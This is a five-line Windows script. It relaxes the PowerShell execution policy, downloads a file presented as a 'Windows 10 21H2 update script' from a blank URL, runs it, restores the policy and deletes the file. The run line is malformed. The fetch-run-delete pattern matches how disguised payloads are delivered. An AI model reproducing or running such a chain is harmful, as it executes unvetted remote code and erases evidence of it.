powershell Set-ExecutionPolicy unrestricted
powershell curl.exe "" -o C:\Windows\Temp\Windows_10_21H2_X64_Update_Script.ps1
powershell .\C:\Windows\Temp\Windows_10_21H2_X64_Update_Script.ps1
powershell Set-ExecutionPolicy  restricted
del C:\Windows\Temp\Windows_10_21H2_X64_Update_Script.ps1
